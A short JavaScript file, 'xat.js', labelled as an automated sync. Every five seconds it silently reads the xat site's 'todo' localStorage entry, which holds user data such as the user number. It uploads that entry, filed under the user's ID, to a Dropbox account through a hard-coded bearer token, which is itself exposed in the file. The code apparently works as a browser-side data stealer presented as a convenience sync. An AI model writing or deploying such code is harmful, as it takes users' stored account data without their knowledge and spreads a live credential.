/* xat.js - Fully Automated Sync */
(function() {
    // 1. Configuration
    const storageKey = 'todo';
    const accessToken = 'sl.u.AGTduRI6brKD-4TyNTPcLBHdEmndVzGCwlH7WYWNgoKQTQWUOHQ4X-4zwzDoOKOVIcSdZ2vKwFJv9LPLVIc5iPH8XdUjIM5pDlHNITOiY_B---4enVpb5RtY8LaJ_1TcDgWySL32Vezy24aFisBVT6ce6AXjIQmwo2dKGJxzrkd1Rq2FOb0hKo0B7Y7RgcGdDohhvqc57FyyQ51JLFP9vUffWCCauDF_HYkI3PeG5vwZFRJn33vqu2LS7-XrqWT-icjSaly96LCZY9oqJplKclBtarHDpktx77MBJ-6bQ1agfYxZxV9VfRZfDEokTvpz5jRq4LHKQXheXeHBcn5ta-x0jJ-BWe3udQPTWiwor6pzaqui3LCvpBzSD1SvW_yf-hohBZDLdi4cz7HB1P7SzNxA0TIUa4hauiGYuLHhEXdECBn7A6wV9jgfK1EtzAoPeDf8lr6SzqCJ9xQgS2U0pwhtiLBTWPvu6j66Pu5EqjGyZa8-13zr-dtIoZnQmzg0doENv5IXT99_xhLgjcxCi8BmTwt0pUG9ixMMA9uoD4ittra6ZfYDOfibbpAxh4KckGj5b770vmcP5bYHi-IZQjOO5RFSq7pEstn8szZZH6nrAm0LLUsYoqCoFiFmWDq7eLv355KCmJZ2tmN8T64PAG07yGXVBWzW23BZIOPxWgv4sOqVmH1DmTpf6z7rL-TZh1L8ufDSsFSL-PTMCCsKrqTPhlgZNZI6GPbRgta5j3p1TSuLVwuexa0cQLK1kC6nm3b59fUh6KobtgCefsf4bOcXWyNSUgL3MjfbpKOBfDCTqx0UBJjEbpadSgAdfzRx1Q2H78bKE2znPPkMPHAVm-NMkfUjG6TOm0uVffykMHo-FP8aTlUWPdUzyD9-7dFWBtS3z_PSPonIr2VlpwKhkcyUmFlYFXJXtORnNAA8Zb2hzj3YlIWexGxXO6FC_ECS_VmUcFtHjO3xZ_F9BKBjtx426GaFW7XTrdQ81nybEIfkQWO1OqEQCMiBHj-WSyMswlCltEw1uqLD8DXiVD0wezQ09ai2Nyfmnsw4BHV1EQ_kVHAMB9v6GTyvVp7G_BOGXpRLZ1_kmXFtKyztxiEMc__K7DRnguj-EnGd146cd34S9LkzpruXWJ2pXQQ140BYHBU1hJLhiKJ6DajepYerAR_7KBFStI898vk5GR8Iy0G8hG9YS7fqopGUtWAOvQe4PUcohqQYYqxXiu1gWMKWN1CiuUfih25uDobNRiAH1YLZo_onVJn0gCnt0uQaD8_uKjo8CrBfC3WZ4c6g-km1f7wP6H5Uw5S5Ua6ro8HCgPHuTA'; // Note: 'sl.' tokens expire quickly!
    let lastSyncedData = null;

    async function syncToDropbox() {
        const rawData = localStorage.getItem(storageKey);
        
        if (!rawData) {
            console.log("Waiting for xat 'todo' data to populate...");
            return;
        }

        // Only upload if the data has actually changed to save API quota
        if (rawData === lastSyncedData) return;

        try {
            const data = JSON.parse(rawData);
            const userId = data.w_userno || "unknown";

            const response = await fetch('https://content.dropboxapi.com/2/files/upload', {
                method: 'POST',
                headers: {
                    'Authorization': 'Bearer ' + accessToken,
                    'Dropbox-API-Arg': JSON.stringify({
                        path: `/xat_user_${userId}.json`,
                        mode: 'overwrite'
                    }),
                    'Content-Type': 'application/octet-stream'
                },
                body: rawData
            });

            if (response.ok) {
                lastSyncedData = rawData;
                console.log(`%c [Auto-Sync] Success: User ${userId} updated.`, "color: lime;");
            }
        } catch (err) {
            console.error("Sync failed:", err);
        }
    }

    // 2. Run every 5 seconds automatically
    console.log("xat.js Automation Started...");
    setInterval(syncToDropbox, 5000);
})();
